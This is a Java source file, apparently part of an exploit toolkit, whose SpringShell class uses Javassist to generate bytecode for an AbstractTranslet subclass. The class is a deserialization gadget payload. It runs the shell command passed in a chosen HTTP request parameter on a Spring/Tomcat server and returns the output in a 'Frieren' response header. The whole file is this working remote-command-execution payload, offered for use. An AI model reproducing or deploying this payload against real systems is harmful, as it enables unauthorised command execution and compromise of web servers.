package com.atlant1c.generate;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.io.IOException;
import java.util.Scanner;

public class SpringShell {
    public static byte[] payload(String pass) throws NotFoundException, CannotCompileException, IOException {
        String s = "public MyClassLoader() {" +
                "    javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();" +
                "    java.lang.reflect.Field r = request.getClass().getDeclaredField(\"request\");" +
                "    r.setAccessible(true);" +
                "    org.apache.catalina.connector.Response response = ((org.apache.catalina.connector.Request) r.get(request)).getResponse();" +
                "    String s = new Scanner(Runtime.getRuntime().exec(request.getParameter(\"" + pass + "\")).getInputStream()).next();" +
                "    response.setHeader(\"Frieren\", s);" +
                "}";

        ClassPool classPool = ClassPool.getDefault();
        classPool.importPackage(Scanner.class.getName());
        CtClass ctClass = classPool.get(AbstractTranslet.class.getName());

        CtClass calc = classPool.makeClass("MyClassLoader");
        calc.setSuperclass(ctClass);
        CtConstructor ctConstructor = CtNewConstructor.make(s, calc);
        calc.addConstructor(ctConstructor);

        return calc.toBytecode();
    }
}
